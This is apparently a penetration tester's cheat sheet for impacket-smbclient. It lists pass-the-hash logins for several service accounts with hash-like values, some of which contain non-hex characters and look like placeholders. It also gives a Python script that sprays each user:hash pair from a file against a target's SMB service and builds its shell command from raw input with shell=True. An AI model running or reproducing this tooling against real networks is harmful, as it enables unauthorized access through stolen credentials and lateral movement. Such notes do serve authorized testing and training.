# impacket-smbclient

```bash
impacket-smbclient subdomain.subdomain.subdomain.domain.com/svc-helpdsk::b2a93fs1e4a9c8d4f2f2d91e0a1b5e6c1-55:13fa8dfb2f0a3ce91b3f1e9a2ac3f02d
subdomain.subdomain.subdomain.domain.com/svc-adm::5e3b2f9d8c4a9e2c3f1a0b2e1d3c9sf04-73:c8e7a39d1f0b92d1cefb3a8d2af1bc93
subdomain.subdomain.subdomain.domain.com/svc-callcent::9f4d2e8b3a1c9d0f8e1as2b3c0d9e8f12-41:ad2e3c1b4f9a0c3e1f9e0b8a3dfc4e7a
subdomain.subdomain.subdomain.domain.com/svc-engine::4c0d9f8b1e2a3b4c9f0es8d2b3a7c1e6d-62:0af3bd2c1f8e9c3d2e1a0f4c8b3a9d17
@[IP] -hashes [LMHASH]:[NTHASH]
```

##### Default LM hash
```bash
aad3b435b51404eeaad3b435b51404ee
```

## impacket hash file parser
- requires the usernames and hashes to be in the same working directory as the script
	- user_and_hash.txt
- prompts for IP and domain
- uses ":" as a delimiter
- EXAMPLE USER:HASH 

##### Code
```python
import subprocess
import time

def execute_impacket(domain, username, ip_address, hash):
    command = f'impacket-smbclient {domain}/{username}@{ip_address} -hashes {hash}'
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    print(result.stdout)

domain = input("Domain: ")
ip_address = input("IP address: ")
file_path = "user_and_hash.txt"

with open(file_path, 'r') as file:
    for line in file:
        username, hash_value = line.strip().split('::')
        execute_impacket(domain, username, ip_address, hash_value)
        time.sleep(4)  # 4 second pause
```
